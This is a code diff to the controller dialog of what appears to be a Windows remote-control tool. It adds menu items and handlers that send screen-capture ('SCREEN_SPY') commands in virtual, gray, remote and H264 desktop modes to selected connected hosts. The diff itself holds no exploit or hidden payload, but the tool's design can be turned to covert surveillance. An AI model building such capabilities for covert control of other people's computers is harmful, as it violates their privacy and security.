@@ -265,6 +265,10 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 	m_bmOnline[3].LoadBitmap(IDB_BITMAP_SHARE);
 	m_bmOnline[4].LoadBitmap(IDB_BITMAP_PROXY);
 	m_bmOnline[5].LoadBitmap(IDB_BITMAP_HOSTNOTE);
+	m_bmOnline[6].LoadBitmap(IDB_BITMAP_VDESKTOP);
+	m_bmOnline[7].LoadBitmap(IDB_BITMAP_GDESKTOP);
+	m_bmOnline[8].LoadBitmap(IDB_BITMAP_DDESKTOP);
+	m_bmOnline[9].LoadBitmap(IDB_BITMAP_SDESKTOP);
 
 	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
 		m_ServerDLL[i] = nullptr;
@@ -356,6 +360,10 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(ID_HELP_FEEDBACK, &CMy2015RemoteDlg::OnHelpFeedback)
 	// 将所有动态子菜单项的命令 ID 映射到同一个响应函数
 	ON_COMMAND_RANGE(ID_DYNAMIC_MENU_BASE, ID_DYNAMIC_MENU_BASE + 20, &CMy2015RemoteDlg::OnDynamicSubMenu)
+	ON_COMMAND(ID_ONLINE_VIRTUAL_DESKTOP, &CMy2015RemoteDlg::OnOnlineVirtualDesktop)
+	ON_COMMAND(ID_ONLINE_GRAY_DESKTOP, &CMy2015RemoteDlg::OnOnlineGrayDesktop)
+	ON_COMMAND(ID_ONLINE_REMOTE_DESKTOP, &CMy2015RemoteDlg::OnOnlineRemoteDesktop)
+	ON_COMMAND(ID_ONLINE_H264_DESKTOP, &CMy2015RemoteDlg::OnOnlineH264Desktop)
 END_MESSAGE_MAP()
 
 
@@ -975,6 +983,10 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_SHARE, MF_BYCOMMAND, &m_bmOnline[3], &m_bmOnline[3]);
 	Menu.SetMenuItemBitmaps(ID_MAIN_PROXY, MF_BYCOMMAND, &m_bmOnline[4], &m_bmOnline[4]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_HOSTNOTE, MF_BYCOMMAND, &m_bmOnline[5], &m_bmOnline[5]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_VIRTUAL_DESKTOP, MF_BYCOMMAND, &m_bmOnline[6], &m_bmOnline[6]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_GRAY_DESKTOP, MF_BYCOMMAND, &m_bmOnline[7], &m_bmOnline[7]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND, &m_bmOnline[8], &m_bmOnline[8]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);
 
 	// 创建一个新的子菜单
 	CMenu newMenu;
@@ -2479,4 +2491,32 @@ void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
 		m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), buf->length());
 	}
 	LeaveCriticalSection(&m_cs);
+}
+
+
+void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
+{
+	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF };
+	SendSelectedCommand(bToken, sizeof(bToken));
+}
+
+
+void CMy2015RemoteDlg::OnOnlineGrayDesktop()
+{
+	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY };
+	SendSelectedCommand(bToken, sizeof(bToken));
+}
+
+
+void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
+{
+	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF };
+	SendSelectedCommand(bToken, sizeof(bToken));
+}
+
+
+void CMy2015RemoteDlg::OnOnlineH264Desktop()
+{
+	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264 };
+	SendSelectedCommand(bToken, sizeof(bToken));
 }
